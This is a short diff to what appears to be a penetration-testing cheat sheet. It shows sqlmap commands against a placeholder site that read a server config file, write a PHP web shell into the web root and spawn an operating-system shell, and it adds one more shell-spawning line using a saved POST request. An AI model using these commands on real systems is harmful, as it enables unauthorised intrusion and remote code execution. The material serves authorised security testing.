@@ -2955,7 +2955,8 @@ sqlmap -u "http://www.example.com/?id=1" --file-read=/etc/nginx/sitesenabled/def
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 
 # Spawn a shell
-sqlmap -u "http://www.example.com/?id=1" --os-shell  
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 ```
 ## Attacking Common Applications
 
